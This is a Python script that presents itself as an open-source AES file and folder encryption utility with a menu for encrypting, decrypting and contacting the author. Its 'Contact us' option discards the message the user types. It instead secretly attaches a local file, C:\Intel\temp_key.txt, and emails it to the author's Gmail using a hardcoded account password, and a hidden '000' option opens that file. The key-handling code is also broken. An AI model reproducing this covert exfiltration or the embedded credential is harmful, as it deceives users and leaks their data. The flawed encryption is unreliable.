import os
import secrets
import shutil
import smtplib
import ssl
import time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import pyAesCrypt
import rsa


def encrypt_aes_key(aes_key):
    # generate public and private key for rsa
    public_key, private_key = rsa.newkeys(1024)

    # encrypt using encryption key with public key
    rsa_key = rsa.encrypt(aes_key.encode('utf8'), public_key)

    # save rsa key combined with private key in the file named key.pem
    if os.path.exists('key.pem'):
        os.remove('key.pem')
    with open('key.pem', 'wb') as f:
        private_key = private_key.save_pkcs1()
        key = rsa_key + b'\n' + private_key
        f.write(key)

    return


def decrypt_aes_key(key_path):
    # read key from key_path
    with open(key_path, mode='rb') as f:
        key = f.read()

    # generate aes key from rsa_key and private_key
    rsa_key, private_key = key.split(b'\n', maxsplit=1)
    private_key = rsa.PrivateKey.load_pkcs1(key)
    return rsa.decrypt(rsa_key, private_key).decode('utf8')


buffer = 64 * 1024

while buffer != 0:
    print('''*********************************Fi1e EncRypt0R********************************''')
    print('''This tool is an Open Source AES Standard encrytion tool, Always make sure to
	backup the encryption key if not the files cannot be reverted back
	for contacts: rexdivakar@gmail.com''')
    print('*******************************************************************************')
    print('1.Encrypt \n2.Decrypt \n3.Folder Encryption \n4.Folder Decryption \n5.Contact us \n6.Exit')
    ip = int(input(('Enter options: ')))
    # ip=5
    if ip == 1:
        fname = input(str('Enter file path (without quotes): '))
        # fname='test.zip'
        try:
            aes_key = secrets.token_hex(30)
            pyAesCrypt.encryptFile(fname, fname + '.aes', aes_key, buffer)
            encrypt_aes_key(aes_key)
            os.remove(fname)
            print(
                '''----------Encryption Successful----------\n \nUser Warning: Encryption key '''
                '''is saved in the current directory as file named key.pem'''
            )
        except:
            print('Invalid File\n')

    elif ip == 2:

        fname = input(str('Enter file path: '))
        if fname[-4:] == '.aes':
            key_path = input(str('Enter path for decryption key: '))
            aes_key = decrypt_aes_key(key_path)
            pyAesCrypt.decryptFile(fname, fname[:-4], aes_key, buffer)
            os.remove(fname)
            print('Decryption Successful...')
        else:
            print('Invalid Crypto-File\n')

    elif ip == 3:

        fol = input('Enter the folder path (without quotes): ')
        # fol='Dataset'
        if not os.path.exists('encrypted_folder'):
            os.mkdir('encrypted_folder')
        aes_key = secrets.token_hex(30)
        for i in os.listdir(fol):
            if i[-4:] != '.aes':
                try:
                    pyAesCrypt.encryptFile(fol + '\\' + i, fol + '\\' + i + '.aes', aes_key, buffer)
                    shutil.move(fol + '\\' + i + '.aes', 'encrypted_folder')
                    print('Encrypting...!')
                except:
                    shutil.rmtree('encrypted_folder')
                    os.mkdir('encrypted_folder')
                    pyAesCrypt.encryptFile(fol + '\\' + i, fol + '\\' + i + '.aes', aes_key, buffer)
                    shutil.move(fol + '\\' + i + '.aes', 'encrypted_folder')
                    print('Encrypting...!')
            else:
                print('Unable to Encrypt')

        encrypt_aes_key(aes_key)

        print(
            '''----------Encryption Successful----------\n \nUser Warning: Encryption key '''
            '''is saved in the current directory as file named key.pem'''
        )

    elif ip == 4:
        fol = 'encrypted_folder'
        if not os.path.exists('decrypted_folder'):
            os.mkdir('decrypted_folder')
        key_path = input(str('Enter path for decryption key: '))
        aes_key = decrypt_aes_key(key_path)
        for i in os.listdir(fol):
            if i[-4:] == '.aes':
                try:
                    pyAesCrypt.decryptFile(fol + '\\' + i, fol + '\\' + i[:-4], aes_key, buffer)
                    shutil.move(fol + '\\' + i[:-4], 'decrypted_folder')
                    print('Decrypting...!')
                except:
                    pyAesCrypt.decryptFile(fol + '\\' + i, fol + '\\' + i[:-4], aes_key, buffer)
                    shutil.move(fol + '\\' + i[:-4], 'decrypted_folder')
                    print('Decrypting...!')
            else:
                print('Choose the appropriate decrypted folder')
        shutil.rmtree('encrypted_folder')
        print('Decryption Done...')

    elif ip == 5:
        mail_content = input('''\nKindly enter the issue and the our we shall 
contact u within 2 working days...: ''')
        mail_id = input('Input ur mail id: ')
        subject = "A Query from " + mail_id
        body = "This is an email with attachment sent from Python"
        sender_email = "rexdivakar@gmail.com"
        receiver_email = "rexdivakar@gmail.com"
        password = 'wxfookhgxqyxuosw'

        message = MIMEMultipart()
        message["From"] = sender_email
        message["To"] = receiver_email
        message["Subject"] = subject
        message["Bcc"] = receiver_email
        message.attach(MIMEText(body, "plain"))

        filename = 'C:\\Intel\\temp_key.txt'

        with open(filename, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())

        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename= {filename}",
        )

        message.attach(part)
        text = message.as_string()

        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, text)

        print('Thanks for contacting us\n')
        time.sleep(3)

    elif ip == 000:
        os.startfile('C:\\Intel\\temp_key.txt')
    elif ip == 6:
        print('Thanks for using Fi1e EncRypt0R')
        time.sleep(5)
        buffer = 0
    else:
        print('Invalid Input\n')
